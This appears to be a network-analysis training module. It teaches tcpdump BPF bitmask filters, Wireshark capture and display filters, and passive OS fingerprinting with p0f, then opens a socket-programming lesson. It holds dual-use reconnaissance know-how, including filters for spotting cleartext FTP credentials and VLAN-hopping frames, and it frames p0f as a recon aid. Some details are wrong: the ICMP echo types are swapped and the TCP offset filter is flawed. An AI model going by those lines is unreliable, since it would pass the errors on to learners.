The smallest filter that BPF can understand easily is a byte.

A span of bytes can be denoted as in the BPF Bytecode example "ether[12:2]", starts at byte offset 12 and span 2 bytes in to look at the ethertype field.

Using BPFs with operators, bitmasking, and TCPDump creates a powerful tool for traffic filtering and parsing.

SYNTAX


console

tcpdump {A} [B:C] {D} {E} {F} {G}

A = Protocol ( ether | arp | ip | ip6 | icmp | tcp | udp )
B = Header Byte number
C = optional: Byte Length. Can be 1, 2 or 4 (default 1)
D = optional: Bitwise mask (&)
E = Relational operator ( = | == | > | < | <= | >= | != | () | << | >> )
F = Result of Expression
G = optional: Logical Operator (&& ||) to bridge expressions
Example:

tcpdump 'ether[12:2] = 0x0800 && (tcp[2:2] != 22 && tcp[2:2] != 23)'

This expression will look for any IPv4 traffic that is not SSH or Telnet.

First it will look at ether[12:2] which is typically the ethertype field. The expression tells the system to check if this field contains 0x0800.

Conjoin the first expression with the &&.

Using the () and || operators we can build two or more expressions to look for. In this case it checks if the TCP destination field (tcp[2:2]) does not contain 22 or 23.



Resources


Instructor Note


4.2.4.3 Bitwise Masking¶
When using Berkeley Packet Filters, we have the ability to specify capture filters with greater precision by using bit-wise masking. This enables us to specify filters down to the bit-level. After we specify the byte(s) to be examined, we would then need to apply a mask to specify which bits are significant (1) and which bits are insignificant (0).

In this image we are applying a bitwise mask to byte [0] of the IP header. This byte contains both the Version and Internet Header Length (IHL) fields with each being 4-bits or 1 nibble. We know that all ipv4 traffic will contain a value of 4 (0x4) in the high nibble to signify the version. The IHL field is normally 5 to signify that the IP header is 5 WORDS (32-bits) in length. We can apply a filter to focus on only the IHL field and print any packets that this field is greater than 5.


ip[0] & 0x0F > 0x05




In this image we are applying a bitwise mask on the Fragmentation offset field in the IP header. This field consumes the lower 6-bits of byte [6] and the entirety of byte [7]. So to examine this field, we will need to read both bytes [6] and [7] but ignore the first 3-bits in byte [6].


ip[6:2] & 0x1fff > 0x0000




Resources


Instructor Note


4.2.4.3.1 Filter Logic - Most exclusive¶
All designated bit values must be set; no others can be set.


tcp[13] = 0x11
--or--
tcp[13] & 0xFF = 0x11





tcpdump "tcp[13] = 0x11" -r tcpflags.pcap
tcpdump "tcp[13] = 0x11" -r tcpflags.pcap | wc -l


Resources


Instructor Note


4.2.4.3.2 Filter Logic - Less exclusive¶
All designated bits must be set; all others may be set.


tcp[13] & 0x11 = 0x11



tcpdump "tcp[13] & 0x11 = 0x11" -r tcpflags.pcap
tcpdump "tcp[13] & 0x11 = 0x11" -r tcpflags.pcap | wc -l


Resources


Instructor Note


4.2.4.3.3 Filter Logic - Least exclusive¶
At least one of the designated bits must be set to not equal 0; all others may be set.


tcp[13] & 0x11 !=0


Least Exclusive:

Selects any packet that has ACK or FIN set and also has any other flag set.


tcpdump "tcp[13] & 0x11 !=0" -r tcpflags.pcap
tcpdump "tcp[13] & 0x11 !=0" -r tcpflags.pcap | wc -l


Resources


Instructor Note


4.2.5 Use a BPF to filter packets entering a network interface¶


Resources


Instructor Note


4.2.5.1 BPFs at the Data-Link layer¶
Using BPFs to print source and destination MAC addresses. Since the maximum amount of bytes that can be read with BPF is 4 and the size of a MAC address is 6 bytes, we may have to prepare the filter in 2 or more parts conjoined.

Here are 2 ways we can search for the destination broadcast MAC address.


tcpdump 'ether[0:4] = 0xffffffff and ether[4:2] = 0xffff'
tcpdump 'ether[0:2] = 0xffff and ether[2:2]= 0xffff and ether[4:2] = 0xffff'
Here are 2 ways we can search for the source MAC address of fa:16:3e:f0:ca:fc.


tcpdump 'ether[6:4] = 0xfa163ef0 and ether[10:2] = 0xcafc'
tcpdump 'ether[6:2] = 0xfa16 and ether[8:2]= 0x3ef0 and ether[10:2] = 0xcafc'
Search the first byte of the source (ether[0]) and destination (ether[6]) MAC to determine if it's a unicast (0x00) or multicast (0x01) MAC address.


tcpdump 'ether[0] & 0x01 = 0x00'
tcpdump 'ether[0] & 0x01 = 0x01'
tcpdump 'ether[6] & 0x01 = 0x00'
tcpdump 'ether[6] & 0x01 = 0x01'
Using BPFs to print packets interface with the EtherType (ether[12:2]) field matching IPv4, ARP, VLAN Tag, and IPv6 respectively.


tcpdump ether[12:2] = 0x0800
tcpdump ether[12:2] = 0x0806
tcpdump ether[12:2] = 0x8100
tcpdump ether[12:2] = 0x86dd
Print packets that belong to VLAN 100. Here we are masking out the 4-bit PCP/DEI field. It is unsure if this field will or will not have a value so it's best to ignore these bits unless you are looking for a specific value here.


tcpdump 'ether[12:2] = 0x8100 and ether[14:2] & 0x0fff = 0x0064'
tcpdump 'ether[12:4] & 0xffff0fff = 0x81000064'
Print packets that have a double VLAN Tag.


tcpdump 'ether[12:2] = 0x8100 and ether[16:2] = 0x8100'
Print packets that are potential Double tagging (VLAN Hopping) using VLAN 1 (native) to attack VLAN 999


tcpdump 'ether[12:4] & 0xffff0fff = 0x81000001 && ether[16:4] & 0xffff0fff = 0x810003E7
Print all ARP requests and Reply's respectively.


tcpdump arp[6:2] = 0x01
tcpdump arp[6:2] = 0x02


Resources


Instructor Note


4.2.5.2 BPFs at the Network layer¶
Print all ipv4 packets with the IHL greater than 5. This will indicate that there are IP options included after the IPv4 header but before the next encapsulated header.


tcpdump 'ip[0] & 0x0f > 0x05'
tcpdump 'ip[0] & 15 > 5'
Print ipv4 packets with the DSCP value of 16.


tcpdump 'ip[1] & 0xfc = 0x40'
tcpdump 'ip[1] & 252 = 64'
tcpdump 'ip[1] >> 2 = 16'
Print ipv4 packets with various RES, DF or MF flags set.

Print ipv4 packets with ONLY the RES flag set. DF and MF must be off.


tcpdump 'ip[6] & 0xE0 = 0x80'
tcpdump 'ip[6] & 224 = 128'
Print ipv4 packets with ONLY the DF flag set. RES and MF must be off.


tcpdump 'ip[6] & 0xE0 = 0x40'
tcpdump 'ip[6] & 224 = 64'
Print ipv4 packets with ONLY the MF flag set. RES and DF must be off.


tcpdump 'ip[6] & 0xE0 = 0x20'
tcpdump 'ip[6] & 224 = 32'
Print ipv4 packets with any flag combination.


tcpdump 'ip[6] & 0xE0 > 0'
tcpdump 'ip[6] & 224 != 0'
Print ipv4 packets with the RES bit set. The other 2 flags are ignored so they can be on or off.


tcpdump 'ip[6] & 0x80 = 0x80'
tcpdump 'ip[6] & 128 = 128'
Print ipv4 packets with the DF bit set. The other 2 flags are ignored so they can be on or off.


tcpdump 'ip[6] & 0x40 = 0x40'
tcpdump 'ip[6] & 64 = 64'
Print ipv4 packets with the MF bit set. The other 2 flags are ignored so they can be on or off.


tcpdump 'ip[6] & 0x20 = 0x20'
tcpdump 'ip[6] & 32 = 32'
Print ipv4 packets with the offset field having any value greater than zero (0).


tcpdump 'ip[6:2] & 0x1fff > 0'
tcpdump 'ip[6:2] & 8191 > 0'
Print ipv4 packets with the TTL being equal to and less than 128.


tcpdump 'ip[8] = 128'
tcpdump 'ip[8] < 128'
Print any ICMPv4, TCP, or UDP encapsulated within an ipv4 packet.


tcpdump 'ip[9] = 0x01'
tcpdump 'ip[9] = 0x06'
tcpdump 'ip[9] = 0x11'
Print ipv4 packets with the source and destination address of 10.1.1.1.


tcpdump 'ip[12:4] = 0x0a010101'
tcpdump 'ip[16:4] = 0x0a010101'
Print ipv6 packets with the Traffic Class of any value.


tcpdump 'ip6[0:2] & 0x0ff0 != 0'
Print ipv6 packets with the Flow Label field of any value.


tcpdump 'ip6[0:4] & 0x000FFFFF != 0'
Print any ICMPv6, TCP, or UDP encapsulated within an ipv6 packet.


tcpdump 'ip6[6] = 0x3a'
tcpdump 'ip6[6] = 0x06'
tcpdump 'ip6[6] = 0x11'
Print ipv6 packets with the TTL being equal to and less than 128.


tcpdump 'ip6[7] = 128'
tcpdump 'ip6[7] < 128'
Print ICMPv4 packets set to Destination Unreachable (Type 3) and Network Administratively Prohibited (Code 9). Note: ICMPv6 is not supported by BPFs.


tcpdump 'icmp[0] = 3 and icmp[1] = 9'


Resources


Instructor Note


4.2.5.3 BPFs at the Transport layer¶
The limitations of BPFs is that it will always assume the L3 header is IPv4 whereas Primitives will check for both IPv6 and IPv4.

Using the -d option we can see that using primitives, the expression will search for IPv6 with TCP source port 22 then check for IPv4 with TCP source port 22.


tcpdump -d tcp src port 22 =  Using a primitive to look for source port 22
(000) ldh      [12]
(001) jeq      #0x86dd          jt 2 jf 6
(002) ldb      [20]
(003) jeq      #0x6             jt 4 jf 15
(004) ldh      [54]
(005) jeq      #0x16            jt 14 jf 15
(006) jeq      #0x800           jt 7 jf 15 
(007) ldb      [23]
(008) jeq      #0x6             jt 9 jf 15
(009) ldh      [20]
(010) jset     #0x1fff          jt 15 jf 11
(011) ldxb     4*([14]&0xf)
(012) ldh      [x + 14] 
(013) jeq      #0x16            jt 14 jf 15
(014) ret      #262144
(015) ret      #0
Using -d here we can see that using BPF's it will always assume that IPv4 is the L3 header.


tcpdump -d tcp[0:2]=22
(000) ldh      [12]
(001) jeq      #0x800           jt 2 jf 10
(002) ldb      [23]
(003) jeq      #0x6             jt 4 jf 10
(004) ldh      [20]
(005) jset     #0x1fff          jt 10 jf 6
(006) ldxb     4*([14]&0xf)
(007) ldh      [x + 14]
(008) jeq      #0x16            jt 9 jf 10
(009) ret      #262144
(010) ret      #0
NOTE: #This limitation also applies to UDP.#

Print ipv4 packets with TCP source port 3389.


tcpdump 'tcp[0:2] = 3389'
Print ipv4 packets with TCP destination port 3389.


tcpdump 'tcp[2:2] = 0x0d3d'
Print ipv4 packets with the TCP offset field greater than 5. This will indicate that there are TCP options included after the TCP header but before the data payload or next encapsulated header.


tcpdump 'tcp[12] & 0xf0 > 5'
Print ipv4 packets with the TCP Flags set to ACK+SYN. No other flags can be set.


tcpdump 'tcp[13] = 0x12'
Print ipv4 packets with the TCP Flags set to ACK+SYN. The other flags are ignored so they can be set or unset.


tcpdump 'tcp[13] & 0x12 = 0x12'
Print ipv4 packets with the TCP Flags ACK and SYN are either both on or at least one of them is on. If both are off then those packets are not printed. The other flags are ignored so they can be set or unset.


tcpdump 'tcp[13] & 0x12 != 0'
Prints ipv4 packets with the TCP Urgent Pointer field having a value.


tcpdump 'tcp[18:2] > 0'


Resources


Instructor Note


4.2.6 Understand Wireshark's use of BPFs¶


Resources


Instructor Note


4.2.6.1 Wireshark Display Filters vs Capture filters¶
Sometimes there can be confusion about the differences between these two filters.

Display filters - allow you to change the view of what packets are displayed of those that are captured. Wireshark has specific display filters that it uses and it does not conform to TCPDUMP primitives or BPF format. More information can be found here: DisplayFilter

If you start a Wireshark Packet capture without specifying any capture filters then Wireshark will capture all packets it can regardless if the information is useful or not. ON busy networks you can quickly accumulate packets and all are saved to disk. It is entirely feasible to fill your entire hard drive very quickly causing your computer to freeze and crash if not carefully monitored.


Display filters can be applied to cut thru the captured data to find the information you want.


Capture filters - used to specify which packets should be saved to disk while capturing. By default, there are no capture filters applied so all packets will be captured if nothing is specified. TCPDUMP primitives and/or BPFs can be applied and conjoined to make capture filters. More information can be found here: CaptureFilters

Upon Wireshark start we will be prompted to enter any capture filters.


If Wireshark is already running you can optionally go to Capture -> Options to start or modify a capture filter. Wireshark packet capturing must be stopped to add/change capture filters.


Here we can use primitives or BPFs to add a capture filter.


Here we can see that the filter greatly reduced the amount of packets captured.




Resources


Instructor Note


4.2.6.1.1 Wireshark Display Filters¶
Wireshark display filters are a powerful feature that allows users to selectively view network traffic based on specific criteria. These filters enable users to focus on particular packets of interest while disregarding others, making it easier to analyze network communication and identify relevant information.

Here is a list of common and popular Wireshark Display filters.

Filtering for a particular protocol will give all packets that have the protocol header in the packet payload.

This will NOT show the TCP setup, TCP teardown, or fragmented packets that are part of the communication but do not have the protocol header in payload.
We can filter for specific protocols such as:
Layer 2: eth, arp, vlan, wlan
Layer 3: ip, ipv6, icmp, icmpv6
Layer 4: tcp, udp
Layer 5: smb, socks, rpc
Layer 7: telnet, ssh, http, ssl, tls, quic, dns, ftp, ftp-data, tftp, smtp, pop, imap, dhcp or bootp, ntp, tacplus, radius, rdp
Routing protocols: rip, ospf, bgp
We can filter for specific addresses:

Layer 2: eth.addr, eth.dst ==, eth.src ==
Layer 3: ip.addr ==, ip.dst ==, ip.src ==
Layer 4: tcp.port ==, tcp.dstport ==, tcp.srcport ==, udp.port ==, udp.dstport ==, udp.srcport ==
IPv4 Filters:

IHL: ip.hdr_len == 20, ip.hdr_len > 20
DSCP: ip.dsfield.dscp > 0, ip.dsfield.dscp == 48
ECN: ip.dsfield.ecn > 0. ip.dsfield.ecn == 2
Flags: ip.flags.rb == 1, ip.flags.df == 1
Fragmentation: (ip.flags.mf == 1) || (ip.frag_offset > 0)
TTL: ip.ttl == 64, ip.ttl == 128, ip.ttl <= 64 && ip.ttl > 30 && !(ip.ttl > 64)
Protocol: ip.proto == 1, ip.proto == 6, ip.proto == 17
6-in-4 or 6-to-4 encapsulation: ip.proto == 41
IPv6 Filters:

Traffic Class: ipv6.tclass > 0, ipv6.tclass == 0xe0
Next Header: ipv6.nxt == 6, ipv6.nxt == 17, ipv6.nxt == 58
4-in-6 encapsulation: ipv6.nxt == 4
TCP Specific Filters:

TCP Offset: tcp.hdr_len == 32, tcp.hdr_len > 20
TCP Flags:
Individual Flags: tcp.flags.syn == 1, tcp.flags.ack == 0, tcp.flags.urg == 1. tcp.flags.reset == 1
Flag Combinations: tcp.flags == 0x002, tcp.flags == 0x012, tcp.flags == 0x010, tcp.flags == 0x018
Urgent Pointer: tcp.urgent_pointer > 0
HTTP specific filters:

http.request
http.request.method == <method>
= GET, POST, HEAD, etc.
http.response
http.response.code == <code>
100, 200, 300, 400, etc.
http.user_agent, http.user_agent == "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2) Gecko/20070219 Firefox/2.0.0.2", !(http.user_agent == "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2) Gecko/20070219 Firefox/2.0.0.2")
DNS filters:

Query: A = dns.qry.type == 1, NS = dns.qry.type == 2, SOA = dns.qry.type == 6, AAAA = dns.qry.type == 28, AXFR = dns.qry.type == 252
Response: A = dns.resp.type == 1, NS = dns.resp.type == 2, SOA = dns.resp.type == 6, AAAA = dns.resp.type == 28, AXFR = dns.resp.type == 252
SSH Filters:

ssh.protocol, ssh.protocol == "SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.1"
ARP Filters:

ARP Request/Reply: arp.opcode == 1, arp.opcode == 2
RARP Request/Reply: arp.opcode == 3, arp.opcode == 4
Gratuitous ARP: (arp.opcode == 2) && (eth.addr == ff:ff:ff:ff:ff:ff)
ICMP Filters:

Echo Request: icmp.type == 0
Echo Reply: icmp.type == 8
Time Exceeded: icmp.type == 11
Destination Unreachable and Port Unreachable: (icmp.type == 3) && (icmp.code == 3)
DHCP Filters:

Client to Server: (udp.srcport == 68) && (udp.dstport == 67)
Server to Client: (udp.srcport == 67) && (udp.dstport == 68)
Discover: dhcp.option.dhcp == 1
Offer: dhcp.option.dhcp == 2
Request: dhcp.option.dhcp == 3
Ack: dhcp.option.dhcp == 5
FTP Filters:

Commands: ftp.request.command
Sending username or password: ftp.request.command == "USER", ftp.request.command == "PASS"
Download file: `ftp.request.command == "RETR"
Upload file: ftp.request.command == "STOR"
Switch to passive mode: ftp.request.command == "PASV"
Directory listing: ftp.request.command == "LIST"
Wildcard string filters:

data contains "String" - generic filter used to match packets based on the presence of specific data within the packet payload.
ip contains "String" - specifically targets the IP (Internet Protocol) layer for payload.
http contains "String" - specifically targets the HTTP (Hypertext Transfer Protocol) payload.
Using the not feature:

Generally you can use any filter used above and surround it like this:
!(filter)
Conjoining filter expressions:

both conditions must be true: and or &&
either the first condition or the second condition is true: or or ||
Following Protocol Streams:

In Wireshark, you can follow protocol streams to examine the communication between hosts using various protocols, including TCP, UDP, and others.
Analyze -> Follow ->
TCP Stream ctrl+alt+shift+T
UDP Stream ctrl+alt+shift+U
TLS Stream ctrl+alt+shift+S
HTTP Stream ctrl+alt+shift+H
Apply as filter options:

In Wireshark, the "Apply as Filter" feature allows you to quickly create display filters based on specific packet attributes or values. This feature is useful for narrowing down the packets displayed in the packet list pane to focus on specific criteria of interest.
Identify Packet Attribute: Start by identifying the packet attribute or value you want to create a filter for. This could be any field or value present in the captured packets, such as source or destination IP addresses, port numbers, protocols, packet content, or any other packet attribute.
Select Packet: In the packet list pane of Wireshark, select the packet containing the attribute or value you want to create a filter for. This could be any packet in the packet list that contains the desired attribute.
Right-Click Packet: Right-click on the selected packet to open the context menu.
Apply as Filter: From the context menu, hover over the "Apply as Filter" option. A submenu will appear displaying different filtering options based on various packet attributes, such as IP addresses, protocols, and packet content.
Analyze -> Apply as Filter ->
Selected: This option applies a filter based on the attribute or value of the packet that you currently have selected in the packet list pane. Only packets matching filters are displayed.
Not Selected: This option applies a filter based on the attribute or value of packets that are not currently selected in the packet list pane. All other packets are displayed except those matching filters.
or Selected: This option combines the attribute or value of the packet that you currently have selected in the packet list pane with the attribute or value of other packets. Packets matching first filter or packets matching additional filters.
and Selected: This option combines the attribute or value of the packet that you currently have selected in the packet list pane with the attribute or value of other packets. Packets matching each filter.
or not Selected: This option applies a filter based on the attribute or value of packets that are not currently selected in the packet list pane, in combination with other attributes or values. Additional or conditional filters to exclude from view.
and not Selected: This option combines the attribute or value of packets that are not currently selected in the packet list pane with the attribute or value of other packets. Packets matching each condition is excluded.
Creating additional Columns in the Packet List view:

Drag and drop fields from the Packet Details View to the columns bar.
The rows can be dragged and dropped to arrange them in the desired order.


Resources


Instructor Note
None

4.2.6.2 Popular Wireshark Menus¶
Familiarize students with the various capabilities of Wireshark.

Where the Packet List, Packet Details, and Packet Bytes can be seen
How to capture traffic using a capture filter
How to use the Display filter to target the header locations
How to add columns
How to use the search functionality
We will go through several useful Wireshark menu options:





Resources


Instructor Note


4.2.6.2.1 Colorize traffic¶
DEMO: Menu -> View -> Coloring Rules...
Right click on item -> Colorize Conversation -> (L2 thru L4)


Specifying packet coloring is useful to emphasize particular packets you might be interested in if they match the rules specified. It helps them to stand out from other similar packet data.



Resources


Instructor Note


4.2.6.2.2 Protocol Hierarchy¶
DEMO: Menu-> Statistics -> Protocol Hierarchy


This consists of a tree of all the protocols found in the packet capture. Each row contains the statistical values of one protocol. Two of the columns (Percent Packets and Percent Bytes) serve double duty as bar graphs. This can be used to get an overall synopsis of the data in the capture to help you narrow your search.



Resources


Instructor Note


4.2.6.2.3 Firewall rules (Under "Tools". Assists in creating firewall rules)¶
DEMO: Menu -> Tools -> Firewall ACL Rules


Based off the selected packet in the capture, this feature can help you create firewall rules on the following platforms:

Cisco IOS standard/Extended ACLs
Linux Netfilter (iptables)
OpenBSD (pf)
FreeBSD (ipfw)
Windows Firewall (netsh)


Resources


Instructor Note


4.2.6.2.4 Exporting objects¶
DEMO: Menu -> File -> Export Objects
Can be a useful feature to download any unencrypted images or files sent during the packet capture.



Resources


Instructor Note


4.2.6.2.5 Decrypt traffic¶
DEMO: Menu -> Edit -> Preference -> Protocols -> SSL
Provided that you have the required decryption keys, you can decrypt any encrypted packets in the capture.





Resources


Instructor Note


4.2.6.2.6 Conversations¶
DEMO: Menu -> Statistics -> Conversations
Useful to determine all the end-hosts that are involved in all the communications and how much data is passed between them. Can be used to identify high talkers or unusual communicating addresses.





Resources


Instructor Note


4.2.6.2.7 Endpoints¶
DEMO: Menu -> Statistics -> Endpoints
Displays only the end-point addresses and the amount of data sent.





Resources


Instructor Note


4.2.6.2.8 I/O Graph.¶
DEMO: Menu -> Statistics -> I/O Graph


This can be used to determine packets sent over a period of time and to see low and high traffic periods.



Resources


Instructor Note


4.2.6.2.9 ipv4 and ipv6 statistics¶
DEMO: Menu -> Statistics -> ipv4 Statistics ->
DEMO: Menu -> Statistics -> ipv6 Statistics ->
All Addresses - Divides data by IP address.
Destination and Ports - Divides data by IP address, and further by IP protocol type, such as TCP, UDP, and others. It also shows the port number.
IP Protocol Types - Divides data by IP protocol type.
Source and Destination addresses - Divides data by source and destination IP address.


Resources


Instructor Note


4.2.6.2.10 Expert Information¶
DEMO: Menu -> Analyze -> Expert Information


Wireshark tracks packet anomalies and any other packets of interest and lists them here.



Resources


Instructor Note


4.2.6.2.11 Geo location¶
DEMO: Menu -> Edit -> preferences -> name resolution -> GeoIP database directories "Edit"




Resources


Instructor Note


4.2.7 Describe passive OS fingerprinting (p0f)¶
Passive OS Finger-printer (p0f) is a tool that allows the passive scanning of network traffic. It is a traffic/packet sniffer like TCPDUMP and Wireshark. It makes use of the packet capture libraries like libpcap, winpcap, and NPCAP just as these other traffic sniffers to collect packets. The only thing that separates p0f from other collectors is how it uses and parses the captured data. Rather than capturing all packets, p0f only examines them and matches them to a signature database. This database allows p0f to make a "best guess" on the sending Operating system (OS) and/or application.

Passive OS fingerprinting (p0f) focuses on uniqueness in IP and TCP implementations to discover which OS sent the traffic. Specifically, p0f looks at header and payload items like initial TTL, fragmentation flag, default packet length of an IP header, Windows size, and TCP options in TCP SYN and SYN/ACK packets. The makers of p0f studied this uniqueness and developed a signature database (/etc/p0f/p0f.fp).



Resources


Instructor Note


4.2.7.1 Operating systems, web browsers, search-bots, and tools in database¶
Operating Systems	Web Browsers	Search Robots	Command Line Tools
* Linux (2.4.x, 2.6.x, and 3.x and newer)
* Windows (XP, 7, and 8 and newer)
* FreeBSD (8.x and 9.x and newer)
* OpenBSD (5.x and newer)
* Mac OS X (10.x and newer)
* Solaris (6, 8, and 10 and newer)
* HP-UX (11 and newer)
* OpenVMS (7.x and newer)
* Tru64 (4.x and newer)	* Firefox (2.x - 10.x and newer)
* Microsoft Internet Explorer (6-8 and newer)
* Chrome (11.x - 27.x and newer)
* Opera (10.x - 19.x and newer)
* Android Browser (2.x and 4.x and newer)
* Safari (5.x - 7.x and newer)
* Konqueror (up thru 4.7 and newer)	* BaiduSpider
* Googlebot
* Bingbot
* MSNbot
* Yandex
* Yahoo
* Yahoo Pipes
* Flipboard
* Spinn3r
* Facebook
* paper.li
* Twitter
* linkdex
* Yodaobot
* Tweetmeme
* Archive.org
* Google Web Preview	* wget
* Lynx
* curl
* links
* elinks
* JavaJRE
* Python urllib
* w3m
* libfetch


Resources


Instructor Note


4.2.7.2 p0f fingerprint signature file¶
The P0f Signature Database is a tool used for network fingerprinting and analysis. P0f (Passive OS Fingerprinting) is a tool that can identify the operating system, network characteristics, and other attributes of a device by analyzing the packets it sends on the network, without actively probing the system. It relies on the unique signatures left in network traffic, such as TCP/IP packet characteristics, to create these profiles.

The P0f Signature Database specifically refers to the collection of predefined OS and device fingerprints that P0f uses to recognize and classify systems based on the network traffic they generate. These signatures are crucial for identifying devices and networks in a passive manner, meaning no direct contact is required with the target system.

Whenever p0f fingerprints traffic it reads from the "p0f.fp" file to identify the operating system and other details. Explore the p0f file with the students to explain the way in which the signatures work.



Resources


Instructor Note


6.2.7.2.1 P0f Signature Database¶
The /etc/p0f/p0f.fp file is the location where P0f (Passive OS Fingerprinting) stores its fingerprint database. This file contains a collection of predefined network signatures used by P0f to identify the operating system, device type, and other attributes of systems based on their network traffic.


more /etc/p0f/p0f.fp


Resources


Instructor Note


4.2.7.2.2 Module Specifications¶
Formatted as follows:


[module: direction]
.Module Specifications

Name	Description
module	name of the fingerprinting module (tcp, http, etc.)
direction	direction of the traffic, 'request' from client to server or 'response' for server to client+For the TCP module, 'client' matches initial SYN, and 'server' matches SYN+ACK


Resources


Instructor Note


4.2.7.2.3 Signature Groups¶
A signature must be preceded by a 'label' describing the fingerprinted information.


label = type:class:name:flavor
.Signature Groups

Name	Description
type	typically an 's' for specific signatures and 'g' for more generic ones.
class	this provides the distinction between OS-identifying signatures (win, unix, cisco, etc.), if a '!' is indicated, that corresponds to more application-related signatures (NMap, Apache, Mozilla, etc.)
name	human-readable short name for what the fingerprint actually identifies (Linux, MacOS, Internet Explorer, Mozilla)
flavor	This is for any further information that needs to be appended to the label, such as "Xmas Scan" for NMap or version numbers for Linux "2.x"


Resources


Instructor Note


4.2.7.2.4 MTU Signatures¶
.MTU Signatures

Name	Description
label = Ethernet	self explanatory
sig = 1500	MTU size specification


Resources


Instructor Note


4.2.7.2.5 TCP Signatures¶

sig = ver:ittl:olen:mss:wsize,scale:olayout:quirks:pclass
.TCP Signatures

Name	Description
ver	IP version field. It is 4,6, or * if the version is unimportant to the signature
ittl	initial TTL of the IP packet
olen	IP options length. It is usually 0 for IPv4 and always 0 for IPv6
mss	maximum segment size (mss) that is specified in the TCP options. The * is used to designate that the mss varies
wsize	Windows’ size of the TCP segment. This is expressed as a fixed number, a multiple of the mss, or of the MTU. A rare but possible value is *
scale	is the Window scale (ws) value found in TCP options. If the ws option is not found, this value is 0
olayout	This field represents the TCP option types in the order they appear in the packet, separated by commas. When generating a signature for comparison with the database, this field should be the first that is generated. Eight possible options are:
.Olayout Options (continued from above)

Name	Description
eol+n	explicit end of options followed by n bytes of padding
nop	No Operation (no-op) option
mss	maximum segment size option
ws	Window scaling option
sok	selective ACK permitted option
sack	selective ACK (rarely ever seen)
ts	timestamp option
?n	unknown option ID
quirks	properties observed in the IP or TCP headers. Two common quirks are df for the don’t-fragment flag being set and id+ for when the DF flag is set and the IP identification field is not zero.
pclass	is the payload size of the packet. This is almost always 0, because there is no payload in the three-way handshake.


Resources


Instructor Note


4.2.7.2.6 HTTP signatures¶
P0f can also determine http signatures based on user agent strings and other information contained within a packet.


sig = ver:horder:habsent:expsw
.HTTP Signatures

Name	Description
ver	0, for HTTP/1.0, 1 for HTTP/1.1, or * for any
horder	ordered list of headers that should appear in matching traffic.
habsent	list of headers that must not appear in the matching traffic. Useful for noting the absence of standard headers such as "host"
expsw	expected substrings in the 'user-agent' or 'server' field. This is used to detect dishonest software.


Resources


Instructor Note


4.2.8 Use p0f to capture packets¶


Resources


Instructor Note


6.2.8.1 p0f help¶
Running p0f -h in a terminal provides you with a help message that outlines the various command-line options and flags available for P0f (Passive OS Fingerprinting). Below is a general overview of what you might see when you use p0f -h, though this could vary slightly depending on your system and version of P0f.


root@kali:~# p0f -h
 --- p0f 3.09b by Michal Zalewski <lcamtuf@coredump.cx> ---

        p0f: invalid option -- 'h'
        Usage: p0f [ ...options... ] [ 'filter rule' ]

 Network interface options:

        -i iface  - listen on the specified network interface
        -r file   - read offline pcap data from a given file
        -p        - put the listening interface in promiscuous mode
        -L        - list all available interfaces
        Operating mode and output settings:

        -f file   - read fingerprint database from 'file' (/etc/p0f/p0f.fp)
        -o file   - write information to the specified log file
        -s name   - answer to API queries at a named unix socket
        -u user   - switch to the specified unprivileged account and chroot
        -d        - fork into background (requires -o or -s)

 Performance-related options:

        -S limit  - limit number of parallel API connections (20)
        -t c,h    - set connection / host cache age limits (30s,120m)
        -m c,h    - cap the number of active connections / hosts (1000,10000)
Optional filter expressions (man tcpdump) can be specified in the command line to prevent p0f from looking at incidental network traffic.

Problems? You can reach the author at lcamtuf@coredump.cx.



Resources


Instructor Note


4.2.8.2 Run p0f on interface¶
Passively through traffic monitoring while interacting with a webserver:


p0f -i eth0

(in a separate tab)
wget 172.16.82.106






Resources


Instructor Note


4.2.8.3 Run p0f on a pcap¶
Run TCPDump and perform the same wget command


tcpdump port 80 -w wget.PCAP

(in a separate tab)
wget 172.16.82.106
Passively determine traffic through reading in a packet capture:


p0f -r wget.pcap


Resources


Instructor Note


4.2.8.2 Output to greppable log file¶
Sending the output to a greppable log file for analysis:


sudo p0f -r wget.pcap -o /var/log/p0f.log
sudo nano /var/log/p0f.log


sudo cat /var/log/p0f.log | grep "mod=syn" | grep subj=cli | grep srv=172.16.82.106/80



sudo cat /var/log/p0f.log | grep "mod=syn" | grep srv=10.1.0.2/80 | grep subj=srv


The filter didn't get the results wanted (on purpose for demo), ask the students to troubleshoot this parsing method with you. Listed below is what is wrong:

mod=syn, we are looking for the web server which would respond with a syn+ack, as it isn't the tcp session initiator. srv=10.1.0.2/80, the web server should address is 172.16.82.106/80 +


sudo cat /var/log/p0f.log | grep "mod=syn+ack" | grep srv=172.16.82.106/80 | grep subj=srv


It is evident from the output that it is a Linux server but what type of Linux web server? Dig a little deeper with what you know.

Change the module to http response, grep subject to server, and grep for the server equal to the server hosting the web service on port 80 (172.16.82.106/80)


sudo cat /var/log/p0f.log | grep "mod=http response" | grep srv=172.16.82.106/80 | grep subj=srv
This gives a bit more information and identifies the Ubuntu Linux Distribution.



If we want to view the interaction between the two devices for the entire web request, the following is performed:


sudo cat /var/log/p0f.log | grep srv=172.16.82.106/80 | grep cli=10.10.0.40
Now you will see the modules associated with the conversation, the MTU, syn, syn+ack, http request, and http response:



Key Takeaways:

P0f is an extremely valuable fingerprinting tool that utilizes an array of tcp/ip implementation variances, creating a purely passive traffic fingerprinting mechanism to identify hosts behind any incidental TCP/IP communications without interfering in any way.

Additionally, p0f can generate log files for easy parsing of information, further enhancing the recon effort.

You can be as granular as needed with p0f analysis as long as there is a basic understanding of TCP conversation structure and specific context being searched for.

Socket Programming¶
Lesson Number: 112-CCTC16

Slides¶
Socket Programming Slides
5.0 Outcomes¶
Understand socket types for network functions
Differentiate user space/kernel space sockets
Understand socket creation behavior based on privilege level
Implement Network Programming with Python3
Perform packet creation applying RFC implementation


Socket programming is fundamental to network communication, making it crucial for cybersecurity professionals.

At its core, socket programming gives you direct control over network communication, essentially allowing you to understand and interact with the "plumbing" of the internet. Instead of relying on pre-built functions, socket programming lets you create connections, interact directly with protocols, and bypass network abstractions.

In cybersecurity, this skill is especially important for both defensive and offensive purposes, particularly in vulnerability discovery and exploitation. Many attacks, such as buffer overflows, format string bugs, DoS attacks, and crafted packet attacks, exploit vulnerabilities at the socket layer. Understanding sockets helps you grasp how these attacks work. Additionally, socket programming allows you to craft malicious packets, a key part of penetration testing where you simulate real-world attacks to identify and exploit vulnerabilities.

